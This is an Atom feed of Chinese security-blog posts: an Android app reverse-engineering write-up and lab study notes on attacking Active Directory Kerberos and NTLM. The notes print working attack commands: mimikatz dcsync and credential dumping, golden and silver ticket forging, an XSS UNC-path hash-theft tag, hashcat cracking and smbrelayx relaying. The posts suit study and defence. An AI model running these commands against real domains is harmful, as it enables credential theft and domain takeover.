<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://thekingofduck.github.io</id>
    <title>CoolCat&apos; Blog</title>
    <updated>2020-03-18T15:02:23.840Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://thekingofduck.github.io"/>
    <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
    <subtitle>当代废物</subtitle>
    <logo>https://thekingofduck.github.io/images/avatar.png</logo>
    <icon>https://thekingofduck.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
    <entry>
        <title type="html"><![CDATA[某APP逆向分析与通讯解密]]></title>
        <id>https://thekingofduck.github.io/post/Android-Program-Reverse-Analysis/</id>
        <link href="https://thekingofduck.github.io/post/Android-Program-Reverse-Analysis/">
        </link>
        <updated>2020-03-17T08:15:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-初始化">0x01 初始化</h3>
<p>年轻人，你是否因看到这样的逆向结果而感到无力？</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/26DD303B-1B36-49D7-9A00-CD772B7556C9.png" alt="" loading="lazy"></figure>
<p>你是否为抓不到包而感觉渗透失去了意义？</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844200931687.jpg" alt="" loading="lazy"></figure>
<p>回归正题，拿到app后初步了解后有下面几个问题：</p>
<ul>
<li>无法抓包</li>
<li>做了加固</li>
<li>通讯加密</li>
</ul>
<p>也是常见APP反篡改的手段了，简单记录一下自己是如何解决这些问题的。</p>
<h3 id="0x02-加载中">0x02 加载中</h3>
<h4 id="无法抓包">无法抓包</h4>
<p>姿势其实特别多，大部分app的做法都只是反代理，挂vpn是不会拒绝连接的，所以原理上只需要建一个虚拟vpn，使app流量通过这个vpn中转，中间环节解密流量即可。</p>
<p>参考工具<br>
安卓：HttpCanary<br>
苹果：Surge (随便问问有没有师傅组队买surge mac版的授权)</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844205931604.jpg" alt="-w522" loading="lazy"></figure>
<h4 id="做了加固">做了加固</h4>
<p>已知思路有三，</p>
<ul>
<li>脱壳</li>
<li>模拟人工</li>
<li>Hook包中的相关函数直接进行测试</li>
</ul>
<p><strong>脱壳前</strong></p>
<p>脱壳方式/工具也是蛮多的，引用一位师傅说过的话：</p>
<p>1.默念一声&quot;我想脱个壳&quot;。<br>
2.启动 APP。<br>
3.启动 frida-server。<br>
4.python main.py。</p>
<p>默数三秒，脱好了。</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844277956685.jpg" alt="-w880" loading="lazy"></figure>
<p>第二种方式的demo:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844214019846.jpg" alt="-w1225" loading="lazy"></figure>
<p>第三中方式用的人最多，但是比较麻烦，加壳了找函数不方便，不加壳的话直接看代码硬怼就是行。</p>
<p><strong>脱壳后</strong></p>
<p>dex2jar，然后丢进反编译工具</p>
<p>找核心算法其实很容易，比如直接搜一下加密包中header的特征字段</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844290955076.jpg" alt="-w450" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844289523233.jpg" alt="-w1480" loading="lazy"></figure>
<p>跟踪到下面的加密部分：<br>
<img src="https://thekingofduck.github.io/post-images/app1/15844107807705/7C6DE6AD-DEC5-4D38-8D67-BCD2C7873D14.png" alt="7C6DE6AD-DEC5-4D38-8D67-BCD2C7873D14" loading="lazy"><br>
圈起来的为止就是加密的关键点了，点击一下跳过去即可。</p>
<p><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/6F2066C9-F42F-4A59-BBFE-E76001CA679D.png" alt="6F2066C9-F42F-4A59-BBFE-E76001CA679D" loading="lazy"><br>
传入的第一个字符串是需要加密的值，第二个是密钥。密钥可以在上上图中<code>getEncryptAES(paramRequest)</code>跟过去找到：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/388D7F7D-0A24-406E-B0A8-194687ECF9D2.png" alt="388D7F7D-0A24-406E-B0A8-194687ECF9D2" loading="lazy"></figure>
<p>加密算法代码已知，密钥已知，那顺手就可以copy出来自己加解密了：</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/E32C1720-8214-434B-975F-FD9B65E82F9A.png" alt="E32C1720-8214-434B-975F-FD9B65E82F9A" loading="lazy"></figure>
<p>还可以顺手写成burp插件，方便进行漏洞测试：</p>
<p><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/216107F1-9491-4FE8-ACC4-91E5050D5F51.png" alt="216107F1-9491-4FE8-ACC4-91E5050D5F51" loading="lazy"><br>
注册一个右键菜单方便在repeater里面加解密，注册一个payload处理，方便用于爆破之类的操作。</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/77583F6C-3A67-420B-B86A-4E94CFEF0A85.png" alt="77583F6C-3A67-420B-B86A-4E94CFEF0A85" loading="lazy"></figure>
<p>打包一下就可以扔给burp了。</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844303010949.jpg" alt="-w1480" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844304184113.jpg" alt="-w627" loading="lazy"></figure>
<p>一切顺利成章。</p>
<h3 id="0x03-加载成功">0x03 加载成功</h3>
<p>抓包问题可以以微信为测试目标进行尝试，能抓到微信的其他的基本也就都可以抓到了；脱壳不能指望静态脱壳，还是多考虑怎么从内存中提取出dex来；通讯解密/反校验需要java基础，跟着代码构造出正确的数据包即可，看多了其实也就那么几种算法，各个算法加解密的要素了然于心后还原出解密代码不过copy一下，再解决反编译工具的错误即可；写burp插件也是一个样子，看多了就和套模板，背答案做题目差不多。</p>
<p>解决抓包，解决脱壳，再解决通讯加密后就是常规的web测试方法了，一切变得索然无味。</p>
<p><strong>技术交流：</strong></p>
<ul>
<li>WX:TheKingOfGaGaGa</li>
<li>Github:<a href="https://github.com/TheKingOfDuck">https://github.com/TheKingOfDuck</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记六：Kerbroes委派攻击及与NTLM Relay的组合]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-6-Kerbroes-Delegation-NTLM-Relay/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-6-Kerbroes-Delegation-NTLM-Relay/">
        </link>
        <updated>2020-03-04T14:49:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
<blockquote>
<p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
</blockquote>
<p>回顾正常的认证流程：</p>
<p>KDC认证的部分</p>
<p>1.用户告诉AD我是谁，AD给用户TGT。<br>
2.用户拿着TGT并携带身份告诉AS我是谁，AS给用户TGS<br>
3.用户拿着TGS要求访问服务，服务询问AS TGS是否存在。</p>
<p>委派：<br>
1.用户正常进行向KDC发起一次认证请求，KDC返回第一个TGS。<br>
2.用户携带已有的TGS请求需要一个FTGT(Forwardable TGT),KDC返回一个FTGT。<br>
3.用户携带已有的TGS告诉KDC需要一个能访问Service1的TGS，KDC返回能访问Service1的TGS1<br>
4.用户携带FTGT以及能访问Service1的TGS1访问Service1。<br>
5.Service1将用户携带过来的FTGT发送给KDC，并要求一个能访问Service2的TGS2，KDC返回TGS2给Service1。<br>
6.Service1代表用户携带TGS2向Service2请求资源，Service2把资源返回给Service1<br>
7.Servive1将自身资源与Service资源以并返回给用户。</p>
<p>还没学完垃圾Gridea就一起同步了。</p>
<p>参考文章：<br>
<a href="https://xz.aliyun.com/t/7217">Kerberos委派攻击</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记五：攻击Kerbroes]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/">
        </link>
        <updated>2020-03-04T10:10:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="用户名遍历">用户名遍历</h3>
<p>回顾Kerbroe的认证流程第一步：</p>
<ul>
<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
</ul>
<p>如果Web测试做的多就知道第一步就存在用户名遍历问题。</p>
<p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583318637446.png" alt="" loading="lazy"></figure>
<h3 id="票据伪造">票据伪造</h3>
<h4 id="golden-ticket">Golden Ticket</h4>
<p>AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的的来的，krbtgt用户的hash也是可以提取出来的，这就意味着ticket是可以自己计算出来的。Golden Ticket就是自己计算TGT去生成的TGS，换在买车票的比喻中就相当于伪造身份证去买票。</p>
<p><strong>Golden Ticket价值和域控相似</strong></p>
<p>伪造条件：</p>
<ul>
<li>Domain SID</li>
<li>Domain name</li>
<li>需要krbtgt用户的hash</li>
<li>用户名随意</li>
</ul>
<p>伪造过程</p>
<p>1.获取krbtgt hash</p>
<pre><code>mimikatz &quot;lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt&quot; &quot;exit&quot; &gt; krbtgthash.txt
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583324821594.png" alt="" loading="lazy"></figure>
<p>2.生成票据文件</p>
<pre><code>mimikatz &quot;kerberos::golden /admin:CoolCat /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /krbtgt:b0164177afec62432418903208c1e247 /ticket:golden.kiribi&quot;  &quot;exit&quot;
</code></pre>
<p>其中sid最后一个“-”之后的要去掉，这个很细节。<br>
<img src="https://thekingofduck.github.io/post-images/1583326167707.png" alt="" loading="lazy"></p>
<p>3.将票据文件导入内存</p>
<pre><code>mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt golden.kiribi&quot; &quot;kerberos::list&quot; &quot;exit&quot;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583326531630.png" alt="" loading="lazy"></figure>
<p>图中红线前后为导入金票前后的权限差异。</p>
<p>值得一提的是目前这个金票只能在域内使用使用，不能跨域，涉及到跨域，域森林时该金票就被局限了，不过可以配合SIDHistory去生成包含根域的金票。</p>
<p>可参考：http://t3ngyu.leanote.com/post/7697c6e55644</p>
<h4 id="silver-tickets">Silver Tickets</h4>
<p>已知目标机器的NTLM hash和域SID时，可以伪造任意用户访问目标机器上的指定服务。其过程不会与KDC通信，因此不会再KDC上留下任何痕迹，只会在目标机器和本机留下日志。可以利用的服务：</p>
<table>
<thead>
<tr>
<th>服务注释</th>
<th>服务名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>WMI</td>
<td>HOST&amp;RPCSS</td>
</tr>
<tr>
<td>Powershell Remoteing</td>
<td>HOST&amp;HTTP</td>
</tr>
<tr>
<td>WinRM</td>
<td>HOST&amp;HTTP</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
</tr>
<tr>
<td>LDAP、DCSync</td>
<td>LDAP</td>
</tr>
<tr>
<td>Windows File Share（CIFS）</td>
<td>CIFS</td>
</tr>
<tr>
<td>Windows Remote Server Administration Tools</td>
<td>RPCSS&amp;LDAP&amp;CIFS</td>
</tr>
</tbody>
</table>
<p>伪造条件</p>
<ul>
<li>
<p>Domain SID</p>
</li>
<li>
<p>Domain name</p>
</li>
<li>
<p>目标机器的NTLM hash</p>
</li>
<li>
<p>任意用户</p>
<p>伪造过程：</p>
<p>导出目标机器的hash：</p>
</li>
</ul>
<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583327211454.png" alt="" loading="lazy"></figure>
<pre><code>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583329253794.png" alt="" loading="lazy"></figure>
<p>伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。</p>
<h3 id="总结">总结</h3>
<p>金票权限大，但是要过kdc，会留下日志。<br>
银票局限在特定服务内使用，不过kdc，只在域服务机器上留下日志。</p>
<p>两者分别去读hash时都需要管理员权限，这是致命的缺陷，在攻击过程中就出现：</p>
<p>&quot;有管理权限就可以直接读管理密码了，要金票银票何用？&quot;</p>
<blockquote>
<p>可以用在权限维持上。</p>
</blockquote>
<p>参考文章：</p>
<p><a href="http://t3ngyu.leanote.com/post/Silver-Tickets">域渗透-权限维持之 Silver Tickets</a><br>
<a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md">域渗透-Ticket</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记四：域认证机制Kerbroes刨析]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/">
        </link>
        <updated>2020-03-04T04:12:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
<p>Active Directory 活动目录，可以将其理解就是域服务。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583199291763.PNG" alt="" loading="lazy"></figure>
<p>负责域内机器管理，用户管理，资源管理，桌面配置，应用支撑等等。</p>
<p><strong>Kerbroes的特点：</strong></p>
<ul>
<li>不依赖于主机认证。</li>
<li>不怕中间人攻击。</li>
<li>使用密钥系统提供认证服务。</li>
</ul>
<p><strong>参与的角色</strong></p>
<ul>
<li>
<p>Client</p>
</li>
<li>
<p>Server</p>
</li>
<li>
<p>KDC（Key Distribution Center 密钥分发中心）</p>
<p>(小结：性质类似于Web中的session)</p>
</li>
</ul>
<p>细分<strong>KDC中的角色</strong>：</p>
<ul>
<li>AD: account database的缩写，其储存了Client白名单，只有在白名单内的Client才能申请TGT</li>
<li>AS：Authentication Service的缩写，验证Client端的身份并为Client生成TGT的服务器</li>
<li>TGS：Ticket Cranting Service的缩写，为Client生成指定服务ticket。</li>
</ul>
<p><strong>物理层面AD和KDC都是域控</strong></p>
<h3 id="kerbroes认证分析">Kerbroes认证分析</h3>
<p>从KDC的参与角色中可以了解到认证分为三块六小步，即一发一收的三个来回。</p>
<ul>
<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
<li>2.Client拿着TGT去向Kerbroes发起请求说需要指定服务的权限，AS返回Ticket给Client。</li>
<li>3.Client拿着Ticket去请求登录服务，服务那边又会去问Kerbroes这个ticket是否是真实的，是就给通过，认证完成。</li>
</ul>
<p>引用一张其他师傅画好的比喻图</p>
<figure data-type="image" tabindex="2"><img src="https://camo.githubusercontent.com/ff275187a475867d6d59773793706b7e26de54eb/68747470733a2f2f696d6167652e333030312e6e65742f696d616765732f32303139303232322f313535303830383234305f356336663734623030363530652e706e67" alt="" loading="lazy"></figure>
<p>个人的理解是这样</p>
<p>将Kerbroes比作购票APP。认证流程比作买票。</p>
<ul>
<li>1.首先你使用身份证(Client name)去购票APP进行注册，购票APP需要核实你是我国公民。不是就直接拒绝(Client Name没再AD白名单中)，没有后续，是公民，但是上了征信黑名单也拒绝。(Client在AD中，但是是在黑名单中)，正常通过后就发放一个账号给你（TGT）</li>
<li>
<ol start="2">
<li>使用账号(TGT)发起买去xxxx的票的请求，买完APP返回了一张去xxxx的票给你(访问指定server的TGS)</li>
</ol>
</li>
<li>拿到票后去车站坐车，乘务员会对你的票进行检验，查看是否为真实的票据。</li>
</ul>
<h4 id="抓包分析">抓包分析</h4>
<p>以下为域用户登录认证包</p>
<p><strong>TGT获取</strong></p>
<ul>
<li>AS-REQ：</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583301307789.png" alt="" loading="lazy"></figure>
<p>Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p>
<p>AS-REP</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583301478916.png" alt="" loading="lazy"></figure>
<p>KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据</p>
<p><strong>TGS获取</strong></p>
<p>TGS-REQ</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583302306281.png" alt="" loading="lazy"></figure>
<p>请求访问指定服务</p>
<p>TGT-REP</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1583302418203.png" alt="" loading="lazy"></figure>
<p>返回Ticket。(这里没分析清楚)</p>
<p><strong>TGS登录服务</strong></p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583303413428.png" alt="" loading="lazy"></figure>
<p>涉及字段比较多，每个字段得含义分析不清楚，查阅资料可以看到详细流程如下：</p>
<pre><code>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳
AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。
TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求
TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)
AP_REQ: Client拿着TGS票据去请求服务
AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。
</code></pre>
<p>分析得贼仔细，太强了。</p>
<h3 id="总结">总结</h3>
<p>分析完Kerbroes认证流程后不难理解为什么NTLM协议的质询阶段很多师傅都是分析错的了,没动手抓包分析国，光看理论把Kerbroes和NTLM认证混淆了。</p>
<p>参考资料</p>
<p><a href="https://www.cnblogs.com/sup3rman/archive/2020/02/18/12329222.html">内网学习之Kerberos协议</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记三：攻击NTLM]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-3-Attack-NTLM/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-3-Attack-NTLM/">
        </link>
        <updated>2020-03-04T02:40:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
<p>最常见Pass The Hash 也就是Hash传递这一手法是就是利用Net-NTLM hash进行攻击的，仔细分析过Windows认证机制机制后会发现它就类似与一个web方面的重放攻击。</p>
<p>比如：</p>
<blockquote>
<p>在一些条件下通过中间人抓到了站点登录后台登录时的Web流量，但是登录密码被前端加密了（比如MD5），hash值无法解密，这时候我们只需要重放这个登陆包就可以完成后台登录认证。</p>
</blockquote>
<p>在Net-NTLM认证过程中Net-NTLM hash传递发生在质询第二个包：</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
<p>里面最关键的字段是用户名以及Response。缺一不可，所以原则上来说进行Hash传递的条件有两:</p>
<ul>
<li>
<p>抓到的Net-NTLM hash字段</p>
</li>
<li>
<p>hash对应的用户名。</p>
<p>个人不觉得能访问目标算条件，不能访问目标或者访问错误的目标想去搞Hash传递攻击本身就是个扯犊子的事情，就像Web重放一样，A站点的包你去重放给截然不同的B本身就很扯。关于协议版本对的上也是个人的总结，因为Net-NTLM协议在不同的版本上又可细分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不同格式的Challenge和加密算法。v1和v2在windows认证机制的学习中以及提到过其不同的地方。</p>
</li>
</ul>
<h3 id="net-ntlm-hash窃取">Net-NTLM Hash窃取</h3>
<p>相关Hash会出现三个地方：</p>
<ul>
<li>
<p>SAM数据库</p>
</li>
<li>
<p>Lsass进程</p>
</li>
<li>
<p>传输过程</p>
<p>前两点已经做过总结：<a href="https://blog.gzsec.org/post/Dumping-Windows-Local-Credentials-Tools/">Windows本地hashdump备忘录</a>, 各类之所以能够读到明文时因为去dump了lsass中缓存的用户输入得到明文，如果明文缓存不存在的情况下（比如2012/10以后系统wdigest默认没开启，明文不存在），读到的其实可以理解为都是NTLM hash。值得注意的是：</p>
<ul>
<li>Net-NTLM hash和NTLM hash不是一回事。</li>
<li>Net-NTLM hash是Net-NTLM认证过程客户端第二次发送给服务端的包中的response字段。</li>
</ul>
</li>
</ul>
<p>了解完成就会明白Net-NTLM hash的窃取主要发生在传输环节，传输环节的攻击无非三个点。</p>
<p>第一是传输前就截取到数据包，类似与Hook app的发包接口获取明文<br>
第二是中间人攻击获取<br>
第三是在接收方获取。</p>
<p>第一个环节明显需要以及有对方能够控制底层流量权限，既然有了还搞啥Hash传递；第二个环节不少很了解，后续再学习；第三个环节需要接收方获取，通常情况下是控到刚好会被目标使用NILM认证访问的几率是很小的。不过可以伪造NTLM认证服务端，再配合其他漏洞进行利用。</p>
<p>比如XSS：</p>
<pre><code>&lt;img src=&quot;\\10.5.100.7\TheKingOfDuck.png&quot;&gt;
</code></pre>
<p>img标签是支持smb协议，然后smb协议本质上走的NTLM认证，NTLM认证在用户输入凭证前又会默认使用本地NTLM Hash先进行认证一遍，所以在无法Getshell的情况下，就可以伪造一个smb客户端，再通过该手法获取到Net-NTLM Hash，最后执行解密工作或hash传递攻击</p>
<p><strong>Responder伪造认证服务端</strong>：</p>
<p>伪造一个Net-NTLM协议认证服务端，当用户进行访问时系统默认会先将本地Net-NTLM hash进行验证，该hash可进行碰撞解密获取密码。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583305815079.png" alt="" loading="lazy"></figure>
<p>在目标机器上访问伪造的客户端(可以是多种形式，比如上面说到的xss获取)</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583305985478.png" alt="" loading="lazy"></figure>
<p>获得Net-NTLM hash：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583306002981.png" alt="" loading="lazy"></figure>
<p>同类工具还有<a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>,原理都是一样的</p>
<h3 id="net-ntlm-hash-利用">Net-NTLM Hash 利用</h3>
<p><strong>Net-NTLMv1 Hash加密策略远弱于v2，拿到Net-NTLM v1 hash就约等于NTLM HASH，v2在暴力破解不成功的情况下就可以考虑Relay攻击</strong></p>
<h4 id="net-ntlm-v2-hash暴力破解">Net-NTLM v2 hash暴力破解</h4>
<p>将Responder获取到的Net-NTLM hash交给hashcat进行暴力破解</p>
<pre><code>hashcat -m 5600 attacker::ADSTUDY:1aef20d3cfba8772:9D01310D04E79AD84A789669BE40EF2C:0101000000000000D9C9E307FDF1D5014454D6B4C6B563920000000002000E0041004400530054005500440059000100060042004F0054000400160061006400730074007500640079002E0063006F006D0003001E0062006F0074002E0061006400730074007500640079002E0063006F006D000500160061006400730074007500640079002E0063006F006D0007000800D9C9E307FDF1D50106000400020000000800300030000000000000000000000000200000D6F78567C955B9EA05E044A994D2307E6DEF8486F2ECA33C9F042A0F501043C10A001000000000000000000000000000000000000900200063006900660073002F00310030002E0035002E003100300030002E0031003000000000000000000000000000 pass.txt --force
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583310530278.png" alt="" loading="lazy"></figure>
<p>如图是暴力破解成功的情况。</p>
<h4 id="net-ntlm-v2-hash-relay">Net-NTLM v2 hash Relay</h4>
<p>以relay2smb为例：</p>
<figure data-type="image" tabindex="6"><img src="https://camo.githubusercontent.com/ac10e8dc32ccc3ce85bc42d7b06472da2dfc0690/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303139303631333135333532383238332e706e673f782d6f73732d70726f636573733d696d6167652f77617465726d61726b2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c33647a4d544d784d6a6b3d2c73697a655f31362c636f6c6f725f4646464646462c745f3730" alt="" loading="lazy"></figure>
<p>利用条件有两：</p>
<ul>
<li>
<p>目标机器不能开启smb签名，否则利用无效,一般情况下,windows server会默认开启,而windows单机系统[win 7/8/8.1/10]默认都不会开。</p>
</li>
<li>
<p>对一些打了ms08-068[KB957097]补丁的老系统[比如windows xp/2003以下的系统]利用无效。</p>
<p><strong>值得一提的是域控默认开启smb签名的,其他默认没开</strong></p>
<p>relay对象10.5.100.7 (win7)<br>
攻击机10.5.100.10 （Kali）<br>
relay到 10.5.100.1 （2012）</p>
<p>在kali 使用nmap来检查签名是否开启，smbrelayx.py模块来发起relay攻击</p>
<pre><code>nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery 10.5.100.7
</code></pre>
</li>
</ul>
<p><img src="https://thekingofduck.github.io/post-images/1583313947570.png" alt="" loading="lazy"><br>
（message_signing: disabled 即可，Responder自带的Runfinger也可以，不用检查也可以，Multirelay也会自动检查的）</p>
<p>在kali上开启relay</p>
<pre><code>python smbrelayx.py -h 192.168.22.162 -c whoami
</code></pre>
<p>在2012上执行</p>
<pre><code>dir \\10.5.100.10\C$
</code></pre>
<p>即可relay成功。</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583332013078.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583332020524.png" alt="" loading="lazy"></figure>
<h3 id="总结">总结</h3>
<p>大多数情况攻击NTLM能成功都是因为NTLM在认证是默认会先使用本地hash去登录目标服务，因此可以制造各种机会去获取到Net-NTLM hash再进一步解密操作。</p>
<ul>
<li>
<p>Net-NTLM v1 hash相对容易破解，拿到就约等于拿到了NTLM hash</p>
</li>
<li>
<p>Net-NTLM v2 hash需要暴力破解</p>
</li>
<li>
<p>NTLM-Relay 攻击的姿势很多，工具也多，msf/smbrelayx.py/Responder</p>
</li>
<li>
<p>触发让系统发送NTLM请求的地方非常多。因为很多地方都支持UNC路径</p>
</li>
</ul>
<p>比如：</p>
<ul>
<li>xss</li>
<li>各种图标（desktop.ini,scf文件，用户头像）</li>
<li>pdf/word</li>
<li>outlook</li>
<li>xxe/ssrf</li>
<li>etc...</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记二：Windows认证机制Net-NTLM刨析]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/">
        </link>
        <updated>2020-03-02T04:09:31.000Z</updated>
        <content type="html"><![CDATA[<p><strong>基础知识</strong></p>
<p>1.Windows本地认证：</p>
<p>认证的密码储存在SAM文件中，其位置为C:/Windows/system32/config/sam，词组security account manager,意思是安全账号管理器，其作用是对windows账户安全管理，类似于linux系统中的/etc/passwd文件,删除该文件即可删除账号密码。这也是PE破解系统密码的原理。</p>
<p>登录认证是会从该文件读取里面的加密后的密码(NTLM hash)和用户输入的密码进行对比。</p>
<p>NTLM hash生成流程如下：</p>
<ul>
<li>
<p>将明文口令转换成十六进制的格式</p>
</li>
<li>
<p>转换成Unicode格式，即在每个字节之后添加0x00</p>
</li>
<li>
<p>对Unicode字符串作MD4加密，生成32位的十六进制数字串</p>
<p>NTLM hash支持Net NTLM认证协议以及本地认证协议。其前身为LM Hash(LM算法脆弱，响应存在一些缺陷。主要出现在xp，03之下的系统)</p>
</li>
</ul>
<p>Net-NTLM认证流程：</p>
<ul>
<li>协商：主要用于确认双方协议版本</li>
<li>质询：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴。</li>
<li>验证：验证主要是在质询完成后，验证结果，是认证的最后一步。</li>
</ul>
<p>质询的完整过程：</p>
<ul>
<li>1.客户端向服务器端发送用户信息(用户名)请求</li>
<li>2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。生成一 个Net-NTLM Hash存在内存中，同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</li>
<li>3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</li>
</ul>
<p>其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。</p>
<p>验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。</p>
<p>注意:</p>
<p>1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同<br>
2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。<br>
3.SMB走的也是Net-NTLM协议。</p>
<p>以上属于Net-NTLM v2协议的详细流程<br>
